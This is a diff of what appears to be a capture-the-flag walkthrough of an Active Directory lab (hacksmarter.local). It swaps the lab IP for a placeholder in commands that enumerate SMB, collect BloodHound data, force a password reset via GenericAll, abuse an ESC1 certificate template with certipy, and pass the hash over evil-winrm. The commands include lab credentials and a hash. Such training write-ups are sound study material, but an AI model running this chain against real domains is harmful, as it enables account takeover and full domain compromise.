@@ -92,7 +92,7 @@ SMB         10.0.23.214     445    DC01    [-] hacksmarter.local\guest: STATUS_A
 Null authentication succeeds at the protocol level but share listing is denied:
 
 ```bash
-nxc smb 10.0.23.214 -u "" -p "" --shares
+nxc smb <DC-IP> -u "" -p "" --shares
 ```
 
 ```
@@ -151,7 +151,7 @@ Fifteen domain accounts. The `.svc` suffix on `alt.svc`, `Soulkiller.svc`, `kei.
 We collect all AD objects into BloodHound for attack path analysis:
 
 ```bash
-nxc ldap dc01.hacksmarter.local -u faraday -p 'hacksmarter123' --bloodhound -c All --dns-server 10.0.23.214
+nxc ldap dc01.hacksmarter.local -u faraday -p 'hacksmarter123' --bloodhound -c All --dns-server <DC-IP>
 ```
 
 The ingestor authenticates over LDAP and collects users, groups, GPOs, OUs, trusts, ACLs, and session data into JSON files consumable by BloodHound CE.
@@ -193,7 +193,7 @@ BloodHound maps a **GenericAll** edge from `alt.svc` to `Yorinobu`. GenericAll i
 We choose forced password reset as the simplest path:
 
 ```bash
-bloodyAD -d hacksmarter.local -u 'alt.svc' -p '<PASSWORD REDACTED>' -H 10.0.23.214 set password Yorinobu '<PASSWORD REDACTED>'
+bloodyAD -d hacksmarter.local -u 'alt.svc' -p '<PASSWORD REDACTED>' -H <DC-IP> set password Yorinobu '<PASSWORD REDACTED>'
 ```
 
 ```
@@ -217,7 +217,7 @@ Credentials validated. BloodHound confirms `Yorinobu` is a member of both **Remo
 ### WinRM Session — Dead End on `Yorinobu`
 
 ```bash
-evil-winrm -i 10.0.23.214 -u Yorinobu -p '<PASSWORD REDACTED>'
+evil-winrm -i <DC-IP> -u Yorinobu -p '<PASSWORD REDACTED>'
 ```
 
 ```
@@ -297,7 +297,7 @@ ESC1 is the canonical ADCS misconfiguration leading to direct privilege escalati
 #### Step 1 — Enumerate Vulnerable Templates
 
 ```bash
-certipy find -u 'Soulkiller.svc@hacksmarter.local' -p '<PASSWORD REDACTED>' -dc-ip 10.0.23.214 -text -enabled -hide-admins -vulnerable -stdout
+certipy find -u 'Soulkiller.svc@hacksmarter.local' -p '<PASSWORD REDACTED>' -dc-ip <DC-IP> -text -enabled -hide-admins -vulnerable -stdout
 ```
 
 **Flag breakdown:**
@@ -345,7 +345,7 @@ We are targeting `the_emperor`, a Domain Admin. BloodHound confirms only two Dom
 Modern Certipy (v5+) embeds the target's object SID in the certificate's security extension to enforce strong certificate mapping. Without a matching SID, the KDC will reject PKINIT authentication on a patched DC. We query LDAP for the account attributes:
 
 ```bash
-certipy account -u 'Soulkiller.svc' -p '<PASSWORD REDACTED>' -dc-ip 10.0.23.214 -user 'the_emperor' read
+certipy account -u 'Soulkiller.svc' -p '<PASSWORD REDACTED>' -dc-ip <DC-IP> -user 'the_emperor' read
 ```
 
 ```
@@ -364,7 +364,7 @@ certipy account -u 'Soulkiller.svc' -p '<PASSWORD REDACTED>' -dc-ip 10.0.23.214 
 
 ```bash
 certipy req -u Soulkiller.svc@hacksmarter.local -p '<PASSWORD REDACTED>' \
-  -dc-ip 10.0.23.214 \
+  -dc-ip <DC-IP> \
   -ca hacksmarter-DC01-CA \
   -template AI_Takeover \
   -upn the_emperor@hacksmarter.local \
@@ -376,7 +376,7 @@ The CA issues the certificate immediately (Request ID 5, no approval required). 
 #### Step 4 — PKINIT Authentication and NT Hash Extraction
 
 ```bash
-certipy auth -pfx the_emperor.pfx -dc-ip 10.0.23.214
+certipy auth -pfx the_emperor.pfx -dc-ip <DC-IP>
 ```
 
 ```
@@ -419,7 +419,7 @@ The `(Pwn3d!)` flag confirms local admin rights — we have Domain Administrator
 ### Domain Compromise — Root Flag
 
 ```bash
-evil-winrm -i 10.0.23.214 -u 'the_emperor' -H 'd87640b0d83dc7f90f5f30bd6789b133'
+evil-winrm -i <DC-IP> -u 'the_emperor' -H 'd87640b0d83dc7f90f5f30bd6789b133'
 ```
 
 ```
